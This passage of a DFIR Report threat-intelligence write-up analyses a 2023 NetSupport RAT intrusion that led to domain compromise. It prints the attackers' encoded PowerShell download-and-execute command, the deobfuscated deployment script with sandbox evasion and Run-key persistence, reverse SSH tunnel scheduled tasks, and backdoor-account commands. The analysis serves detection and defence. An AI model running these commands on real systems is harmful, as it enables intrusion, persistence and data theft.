<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-22587" class="post-22587 post type-post status-publish format-standard hentry category-netsupport entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-123" href="https://thedfirreport.com/category/netsupport/">netsupport</a>
</span>
</div>
<h1 class="entry-title">NetSupport Intrusion Results in Domain Compromise</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/" rel="bookmark"><time class="entry-date published" datetime="2023-10-30T00:38:56+00:00">October 30, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p><a href="https://www.netsupportmanager.com/" target="_blank" rel="noopener">NetSupport Manager</a> is one of the oldest third-party remote access tools still currently on the market with over 33 years of history. This is the first time we will report on a NetSupport RAT intrusion, but malicious use of this tool dates back to at least 2016. During this report, we will analyze a case from January 2023 where a NetSupport RAT was utilized to infiltrate a network. The RAT was then used for persistence and command &amp; control, resulting in a full domain compromise.</p>
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<p>This intrusion began with an email delivered with a zip file containing a malicious Javascript file. Following email delivery, a user extracted and executed the Javascript file. The JavaScript code pulled down an obfuscated PowerShell script that was run in memory. The PowerShell script was responsible for deploying NetSupport onto the system along with ensuring the script was not running in a sandbox and establishing persistence using registry run keys.</p>
<p>Five days after the deployment of NetSupport, the threat actor conducted preliminary reconnaissance by using various Windows utilities like whoami, net, and systeminfo. The threat actor then tried to re-enable a domain admin account that was disabled but appeared to have not succeeded.</p>
<p>This activity was followed several hours later by the installation of an OpenSSH server on the beachhead to facilitate persistence to the machine and network. In order to connect to the OpenSSH server the threat actors established a reverse SSH tunnel from the beachhead to their own server hosted on a VPS provider. </p>
<p>Using the previously mentioned reverse SSH tunnel to proxy connections through the beachhead host, the threat actors created a connection to the domain controller. Through the SSH tunnel the threat actors made use of <a href="https://github.com/fortra/impacket/blob/master/examples/atexec.py" target="_blank" rel="noopener" data-link-card="true">Impackets atexec.py</a> to issue various discovery commands looking for privileged groups and domain joined computers.</p>
<p>Eight hours later, the threat actor changed firewall settings on a remote server and then began using <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener" data-link-card="true">Impackets wmiexec.py</a> to engage in further lateral movement. The threat actor moved cab files to the remote hosts using SMB and then expanded and ran them using wmiexec.py commands. The executed files were also NetSupport malware, however, these were configured to talk to a new command and control server. Once running, the threat actor then setup a scheduled task for persistence on these remote hosts. A few additional discovery commands were then issued on remote hosts before activity ceased.</p>
<p>The threat actors returned the next day deploying NetSupport on a domain controller. With this access they proceeded to dump the NTDS.dit database. After dumping it, they used 7-zip to compress the files. No specific exfiltration was observed but we assess with medium confidence that this archive was exfiltrated over the network via one of the existing command and control channels.</p>
<p>A little less than an hour later, the threat actor moved to another domain controller and proceeded to again dump NTDS.dit. They also dropped and ran <a href="https://www.pingcastle.com/" target="_blank" rel="noopener" data-link-card="true">Pingcastle</a>, an active directory auditing tool. While this was running, they used NetSupport to access a backup server to create a new account and add it to the local Administrators and Remote Desktop groups. Using that account, they logged in using RDP, proxying the connection from the beachhead host.</p>
<p>After logging in, they dropped <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noopener" data-link-card="true">Netscan</a> and a keygen. The threat actor checked on the status of Microsoft Defender and then proceeded to disable it. After disabling the protections, they dropped a renamed ProcDump binary and proceeded to dump LSASS on the domain controller, as well as a backup server.</p>
<p>After this, the threat actor then issued a PowerShell command to search and dump Windows event ID 4624 logon events from the host. These were then zipped using 7-zip and then likely exfiltrated over existing command and control channels for further review. The threat actor also browsed file shares from the domain controller, opening several sensitive documents. Netscan was then moved to the domain controller and executed there. The threat actor issued a few more discovery commands using WMI, and then performed some clean up by killing running tasks like Netscan and the ssh proxy.</p>
<p>The final actions observed involved the threat actor dropping two Nim binaries on a domain controller. These Nim binaries were then used to attempt to create a backdoor user and elevate them to admin level permissions. We did not observe any backdoor account created after execution. After our own testing, we saw the tool failed to work and would return an error. After this, no further hands on activity was seen from the threat actor before they were evicted from the network.</p>
<h2 id="services" class="wp-block-heading"><a href="#services">Services</a></h2>
<p>We offer multiple services including a <a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">Threat Feed</a> service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, Havoc, etc. More information on this service can be found <a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<p>Our <a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">All Intel</a> service includes private reports, exploit events, long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data.</p>
<p>If you are interested in hearing more about our services or would like to talk about a free trial, please reach out using the <a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact Us</a> page. We look forward to hearing from you.</p>
<p>Interested in a DFIR Report sticker, shirt, mug or other merchandise? Check out our <a href="https://thedfirreport.com/merchandise/" target="_blank" rel="noopener">shop</a>.</p>
<h2 class="wp-block-heading">Analysts</h2>
<p>Analysis and reporting completed by <a href="https://twitter.com/iiamaleks" target="_blank" rel="noreferrer noopener">@iiamaleks</a>, <a href="https://twitter.com/MittenSec" target="_blank" rel="noreferrer noopener">@MittenSec</a>, <a href="https://twitter.com/Miixxedup" target="_blank" rel="noreferrer noopener">@Miixxedup</a></p>
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<p>Initial Access began with a ZIP file delivered to a victim through email. This email campaign was observed in the wild occurring between late December 2022 through mid January 2023 according to <a href="https://twitter.com/malware_traffic" target="_blank" rel="noreferrer noopener">Brad/@malware_traffic</a> (Thanks Brad!). An earlier sample was documented <a href="https://www.malware-traffic-analysis.net/2022/12/28/index.html" target="_blank" rel="noreferrer noopener">here</a> using a <a href="https://twitter.com/Unit42_Intel/status/1608185209329008641" target="_blank" rel="noreferrer noopener">USPS delivery theme</a> with some overlap in command and control present between the intrusions. Once the ZIP file is extracted the user is presented with a JavaScript file.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-22593" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-001.png" alt width="2821" height="1776" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-001.png 2821w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-001-300x189.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-001-1024x645.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-001-768x484.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-001-1536x967.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-001-2048x1289.png 2048w" sizes="(max-width: 2821px) 100vw, 2821px" /></a></p>
<p>Once the user clicks on the JavaScript file, WScript will invoke the script.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-002.png"><img decoding="async" class="aligncenter size-full wp-image-22594" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-002.png" alt width="1092" height="212" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-002.png 1092w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-002-300x58.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-002-1024x199.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-002-768x149.png 768w" sizes="(max-width: 1092px) 100vw, 1092px" /></a></p>
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<h3 class="wp-block-heading">NetSupport Deployment</h3>
<p>WScript was used to execute <code>2326.js</code> after the user ran the file from the zipped archive.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-003.png"><img decoding="async" class="aligncenter size-full wp-image-22595" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-003.png" alt width="3756" height="312" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-003.png 3756w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-003-300x25.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-003-1024x85.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-003-768x64.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-003-1536x128.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-003-2048x170.png 2048w" sizes="(max-width: 3756px) 100vw, 3756px" /></a></p>
<p>Following initial execution, <code>2326.js</code> invokes an encoded PowerShell command that reaches out to a hard-coded domain, <code>hxxp://1otal.com/index/index.php</code>, downloading and invoking the contents as PowerShell code.</p>
<pre>"C:\Windows\System32\cmd.exe" /c PowersheLl -nop -w hidden -ep bypaSS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA</pre>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22597" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-004.png" alt width="2958" height="311" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-004.png 2958w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-004-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-004-1024x108.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-004-768x81.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-004-1536x161.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-004-2048x215.png 2048w" sizes="(max-width: 2958px) 100vw, 2958px" /></a></p>
<p>The contents downloaded from <code>hxxp://1otal.com/index/index.php</code> take the form of an obfuscated PowerShell script responsible for the initial deployment of NetSupport. The full obfuscated contents of this script can be found on this <a href="https://gist.github.com/iamaleks/c289bcfc460f85f830726694e2446c8c" target="_blank" rel="noreferrer noopener">link</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22598" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-005.png" alt width="2096" height="723" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-005.png 2096w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-005-300x103.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-005-1024x353.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-005-768x265.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-005-1536x530.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-005-2048x706.png 2048w" sizes="(max-width: 2096px) 100vw, 2096px" /></a></p>
<p>The following is the deobfuscated NetSupport deployment script. Note, this script has been cleaned up for brevity.</p>
<pre># Get Script Filename
${ScriptPath} = Split-Path -parent ${MyInvocation}.MyCommand.Definition

# Check Script Filename Agianst a Blacklist
if (${ScriptPath} -match "avast") {exit}
if (${ScriptPath} -match "avg")      {exit}
if (${ScriptPath} -match "sample")   {exit}
if (${ScriptPath} -match "analysis") {exit}
if (${ScriptPath} -match "malware")  {exit}
if (${ScriptPath} -match "sandbox")  {exit}
if (${ScriptPath} -match "virus")    {exit}

# Wrapper Function around Convert-StringToBinary
function React (${Source}, ${Destination})
{
    Convert-StringToBinary -InputString ${Source} -FilePath ${Destination};
}

# Write a Base64 Encoded String to Disk
function Convert-StringToBinary (${InputString}, ${FilePath})
{
    ${file}= ${InputString}

    ${Data} =  [System.Convert]::FromBase64String(${file})
    ${MemoryStream} = New-Object "System.IO.MemoryStream"
    ${MemoryStream}.Write(${Data}, 0, ${Data}."Length")
    ${MemoryStream}.Seek(0,0) | Out-Null

    ${DecompressedStream} = New-Object System.IO.Compression.GZipStream(${MemoryStream}, [System.IO.Compression.CompressionMode]::Decompress)
    ${StreamReader} = New-Object System.IO.StreamReader(${DecompressedStream})
    ${t} = ${StreamReader}.ReadToEnd()

    ${ByteArray} =  [System.Convert]::FromBase64String(${t});
    [System.IO.File]::WriteAllBytes(${FilePath}, ${ByteArray});
}

# The Install Function is invoked at the end of the script and will have the main execution logic.
function Install
{
    # Registry Path Variables for Persistence, these are written to towards the end of the script.
    [string] ${reg_key} = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    [string] ${reg_name} = "SoftwareUpdater"

    # Embedded File Variables
    ${File1} = Gzip Compressed and Base64 Encoded presentationhost.exe
    ${File2} = Gzip Compressed and Base64 Encoded client32.ini # NetSupport client configuration
    ${File3} = Gzip Compressed and Base64 Encoded HTCTL32.DLL # Dependency DLL
    ${File4} = Gzip Compressed and Base64 Encoded msvcr100.dll # Dependency DLL
    ${File5} = Gzip Compressed and Base64 Encoded nskbfltr.inf # NetSupport component file
    ${File6} = Gzip Compressed and Base64 Encoded NSM.ini # NetSupport component file which tells the installer which components to install
    ${File7} = Gzip Compressed and Base64 Encoded NSM.lic # NetSupport license information file
    ${File8} = Gzip Compressed and Base64 Encoded pcicapi.dll # Dependency DLL
    ${File9} = Gzip Compressed and Base64 Encoded PCICHEK.DLL # Dependency DLL
    ${File10} = Gzip Compressed and Base64 Encoded PCICL32.DLL # Dependency DLL
    ${File11} = Gzip Compressed and Base64 Encoded remcmdstub.exe
    ${File12} = Gzip Compressed and Base64 Encoded TCCTL32.DLL # Dependency DLL

    # Generate Random Folder Name with 8 alphanumeric characters
    ${RandF}=( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8 | &amp;('%') {[char]${_}}) )
    ${FPath} ="$env:appdata\$Randf"
    mkdir ${FPath}

    [string] ${ClientName} = "presentationhost.exe"
    [string] ${remcmdstub} = "remcmdstub.exe"

    React -source ${File1} -destination "$FPath\"+"$ClientName"
    React -source ${File2} -destination "$fpath\client32.ini"
    React -source ${File3} -destination "$fpath\HTCTL32.DLL"
    React -source ${File4} -destination "$fpath\msvcr100.dll"
    React -source ${File5} -destination "$fpath\nskbfltr.inf"
    React -source ${File6} -destination "$fpath\NSM.ini"
    React -source ${File7} -destination "$fpath\NSM.lic"
    React -source ${File8} -destination "$fpath\pcicapi.dll"
    React -source ${File9} -destination "$fpath\PCICHEK.DLL"
    React -source ${File10} -destination "$fpath\PCICL32.DLL"
    React -source ${File11} -destination "$fpath\$remcmdstub"
    React -source ${File12} -destination "$fpath\TCCTL32.DLL"

    # Establish Persistance in Run Key
    New-ItemProperty -Path "$reg_key" -Name "$reg_name" -Value "$fpath\$clientname"  -PropertyType "String"

    # Start NetSupport
    Start-Process "$fpath\$clientname"

    # Remove Files
    ${F}= Get-Content "$env:temp\insghha4.txt"
    Remove-Item $env:TEMP\*.ps1
    Remove-Item ${F}
}

###########################################################
## Begin Execution Here By Invoking the Install Function ##
###########################################################
Install
</pre>
<p>The NetSupport deployment script takes the following steps:</p>
<ol class="wp-block-list">
<li>Check the execution name of the script against a list of filenames, if any match the script will exit.
<ul class="wp-block-list">
<li>The names checked include avast, avg, sample, analysis, malware, sandbox, and virus.</li>
</ul>
</li>
<li>All the required files for the NetSupport deployment are packaged inside the deployment script. All these files will be extracted into a randomly named folder under the users <code>%APPDATA%</code> directory.
<ul class="wp-block-list">
<li>The randomly named folder will be a combination of 8 randomly generated letters and numbers, such as <code>%APPDATA\8EDX3iOx</code> or <code>%APPDATA%\KcEwrg3X</code> .</li>
</ul>
</li>
<li>The NetSupport executable will be added to the Registry Run Key for persistence.</li>
<li>The NetSupport executable will then be invoked to begin execution.</li>
</ol>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22599" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-006.png" alt width="2362" height="838" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-006.png 2362w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-006-300x106.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-006-1024x363.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-006-768x272.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-006-1536x545.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-006-2048x727.png 2048w" sizes="(max-width: 2362px) 100vw, 2362px" /></a></p>
<p>The NetSupport script creates all required files in the <code>%APPDATA%</code> folder.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22600" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-007.png" alt width="2501" height="1586" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-007.png 2501w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-007-300x190.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-007-1024x649.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-007-768x487.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-007-1536x974.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-007-2048x1299.png 2048w" sizes="(max-width: 2501px) 100vw, 2501px" /></a></p>
<p>In addition, an entry was added to <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> for <code>presentationhost.exe </code>(NetSupport) to facilitate persistence on the machine.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22601" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-008.png" alt width="2393" height="269" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-008.png 2393w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-008-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-008-1024x115.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-008-768x86.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-008-1536x173.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-008-2048x230.png 2048w" sizes="(max-width: 2393px) 100vw, 2393px" /></a></p>
<p>Lastly, the PowerShell script will finish by invoking the NetSupport executable directly.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22602" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-009.png" alt width="3634" height="128" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-009.png 3634w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-009-300x11.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-009-1024x36.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-009-768x27.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-009-1536x54.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-009-2048x72.png 2048w" sizes="(max-width: 3634px) 100vw, 3634px" /></a></p>
<h3 class="wp-block-heading">Batch Script Automation</h3>
<p>The threat actor was observed making use of Batch scripts to automate some of their tasks, such as executing discovery programs, dumping credentials, and establishing persistence.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22603" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-010.png" alt width="3422" height="1151" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-010.png 3422w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-010-300x101.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-010-1024x344.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-010-768x258.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-010-1536x517.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-010-2048x689.png 2048w" sizes="(max-width: 3422px) 100vw, 3422px" /></a></p>
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<p>During the beginning stages of the intrusion, the NetSupport deployment script was used to establish persistence using the Run key under the user registry hive. For more details, see the Execution section.</p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22604" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-011.png" alt width="2387" height="397" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-011.png 2387w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-011-300x50.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-011-1024x170.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-011-768x128.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-011-1536x255.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-011-2048x341.png 2048w" sizes="(max-width: 2387px) 100vw, 2387px" /></a></p>
<p>Since the deployment script was PowerShell based, the source process of the registry activity will appear as <code>powershell.exe</code>.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22605" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-012.png" alt width="3790" height="282" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-012.png 3790w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-012-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-012-1024x76.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-012-768x57.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-012-1536x114.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-012-2048x152.png 2048w" sizes="(max-width: 3790px) 100vw, 3790px" /></a></figure>
<p>In addition, a scheduled task was created to launch OpenSSH SSH Server with a specific configuration altered to make OpenSSH listen locally on port 2222 instead of 22.</p>
<pre>schtasks.exe /create /sc minute /mo 1 /tn "SSH Server" /rl highest /tr "C:\ProgramData\sshd\sshd.exe -f C:\ProgramData\sshd\config\sshd_config"</pre>
<p>Following the previous command, another scheduled task was created to establish a reverse SSH tunnel to the attacker&#8217;s server. See the lateral movement section to understand how this aided the attacker&#8217;s activities.</p>
<pre>schtasks.exe /create /sc minute /mo 1 /tn "SSH Key Exchange" /rl highest /tr "C:\ProgramData\sshd\ssh.exe -i C:\ProgramData\sshd\config\keys\id_rsa -N -R 369:127.0.0.1:2222 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="483a27273c0879707d667a787e66797c7e66797a71">[email&#160;protected]</a> -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"</pre>
<p>The entire process related to OpenSSH and its persistence was automated by the threat actors through a script named <code>install.bat</code>. In this case, the script generated a new private key using <code>ssh-keygen</code> and corrected the permissions on the file using <code>icacls;</code> this is required because if the permissions are too open on the private key, SSH will exit with an error. More details regarding the SSH tunneling command executed within the scheduled task can be seen under the <a href="#command-and-control">Command and Control</a> section.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22606" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-013.png" alt width="3258" height="461" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-013.png 3258w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-013-300x42.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-013-1024x145.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-013-768x109.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-013-1536x217.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-013-2048x290.png 2048w" sizes="(max-width: 3258px) 100vw, 3258px" /></a></p>
<p>The threat actor created a local user account and added the user to the Administrators and Remote Desktop Users groups. The newly created user account was named <code>WDAGUtilityAccount2</code> to blend in with the default user account <code>WDAGUtilityAccount</code> present on Windows.</p>
<pre>net  user WDAGUtilityAccount2 Decryptme1488@ /add
net  localgroup Administrators WDAGUtilityAccount2 /add
net  localgroup "Remote Desktop Users" WDAGUtilityAccount2 /add
</pre>
<p>Lastly, the threat actor made use of NIM based tools to authenticate via pass-the-hash and to create a new local administrator user.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22607" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-014.png" alt width="3535" height="215" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-014.png 3535w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-014-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-014-1024x62.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-014-768x47.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-014-1536x93.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-014-2048x125.png 2048w" sizes="(max-width: 3535px) 100vw, 3535px" /></a></p>
<p>The following demonstrates the possible command line parameters of this tool.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22608" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-016.png" alt width="264" height="201" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22609" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-017.png" alt width="248" height="196" /></a></p>
<p>Looking at the strings present in the files we can discover that these are compiled <a href="https://nim-lang.org/" target="_blank" rel="noreferrer noopener">NIM</a> binaries.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22610" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-018.png" alt width="921" height="693" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-018.png 921w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-018-300x226.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-018-768x578.png 768w" sizes="(max-width: 921px) 100vw, 921px" /></a></p>
<p>Sifting further through the strings, we stumble on the command used to create the user account.</p>
